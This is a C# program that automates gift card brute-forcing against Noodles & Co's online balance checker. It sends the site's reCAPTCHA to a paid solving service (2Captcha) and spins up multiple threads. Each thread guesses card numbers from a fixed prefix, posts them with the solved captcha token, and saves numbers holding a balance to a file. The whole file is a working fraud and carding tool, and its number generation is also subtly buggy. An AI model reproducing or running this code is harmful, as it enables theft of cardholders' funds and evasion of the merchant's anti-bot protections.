using System;
using System.Text;
using Leaf.xNet;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using System.Timers;

namespace Noodles_and_co
{

    class Program
    {
        public static int good, bad, captchaa, currentcap;
        static string apikey;
        static void Main(string[] args)
        {
            HttpRequest req = new HttpRequest();
            {
                Console.WriteLine("2Captcha API Key:");
                apikey = Console.ReadLine();
                Console.WriteLine("Threads:");
                int threads = Convert.ToInt32(Console.ReadLine());
                Console.Clear();
                for (int i = 0; i < threads; i++)
                {
                    new Thread(() =>
                    {
                        while (true)
                        {
                            Noodlesandco();
                        }
                    }).Start();
                }
            }
        }


        static void Noodlesandco()
        {
            using (var req = new HttpRequest())
            {
                try
                {
                    // Refresh console title
                    var timer1 = new System.Timers.Timer(250);
                    timer1.Elapsed += Interval;
                    timer1.AutoReset = true;
                    timer1.Enabled = true;

                    //Solve captcha
                    string solving = req.Get("https://2captcha.com/in.php?key=" + apikey + "&method=userrecaptcha&googlekey=6LdYOFwUAAAAAFi5bK41_U9NXKE7cesR8odL-x7q&pageurl=https://www.noodles.com/gift-cards/").ToString();
                    StringBuilder sb = new StringBuilder(solving);
                    sb.Remove(0, 3);
                    solving = sb.ToString();

                    //Increase currentcap by 1 to say it is currently solving this captcha in console title
                    currentcap++;
                    // Wait 30 seconds for captcha to get solved by 2captcha
                    Thread.Sleep(20000);
                retry:
                    Thread.Sleep(10000);
                    // Check if its solved
                    string captchareq = req.Get("https://2captcha.com/res.php?key=" + apikey + "&action=get&id=" + solving).ToString();

                    // Captcha isnt ready so it will retry again in 10 seconds.
                    if (captchareq.Contains("NOT_READY"))
                    {
                        captchaa++;
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine("Captcha not ready, retrying in 10 seconds");
                        Console.ResetColor();
                        goto retry;
                    }

                    // The captcha is finished so remove it from the "currently solving" in the console title
                    currentcap--;
                    StringBuilder sbb = new StringBuilder(captchareq);
                    sbb.Remove(0, 3);
                    captchareq = sbb.ToString();

                    
                    req.UserAgent = Http.ChromeUserAgent();
                    Random rnd = new Random();
                    // Generate gift card
                    int card = rnd.Next(0, 9);
                    card = rnd.Next(0, 9);
                    card = rnd.Next(0, 9);
                    req.KeepAlive = true;

                    // Headers + post data
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                    req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    var postdata = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTQ4NTY1NzA2M2QYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCXN1Ym1pdGJ0bsBoLkwb4HbUeUpXWWj8y%2FDIM4KY&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEWAwKgoJCnBwKY8poaAvzIw6EGDLZ2%2Bd4azbtLJJ2BEsAUbf1arBs%3D&TBCardNumber=80302011086" + card + "&g-recaptcha-response="  + captchareq + "&submitbtn.x=80&submitbtn.y=-8";
                    byte[] postBytes = Encoding.ASCII.GetBytes(postdata);

                    string res2 = req.Post("https://balancechecker.noodles.com/default.aspx" , postBytes).ToString();

                    string balance = Regex.Match(res2, "(?<=class=\"balance\">Your balance: )(.*?)(?=<)").ToString();


                    // Check if empty or if it has no money
                    if(balance.Contains("$0.00"))
                    {
                        bad++;
                        return;
                    }
                    if(string.IsNullOrEmpty(balance))
                    {
                        bad++;
                        return;
                    }

                    Console.ForegroundColor = ConsoleColor.Green;
                    // Writes the gift card on console
                    Console.WriteLine(balance + " | " + "80302011086" + card);
                    Console.ResetColor();

                    // Saving to text file
                    var failed = true;
                    while (failed)
                    {

                        try
                        {

                            TextWriter textWriter = new StreamWriter("good.txt", true);
                            textWriter.WriteLine(balance + " | " + "80302011086" + card);
                            textWriter.Close();
                            failed = false;
                        }
                        catch
                        {
                        }
                    }

                    good++;
                }
                catch
                {
                }
            }
        }
        public static void Interval(Object source, ElapsedEventArgs e)
        {
            Console.Title = "Noodles And Co Made By SteamKey | Good: " + good + " Bad: " + bad + " Captcha Retries: " + captchaa + " Currently solving " + currentcap + " captchas";
        }
    }
}
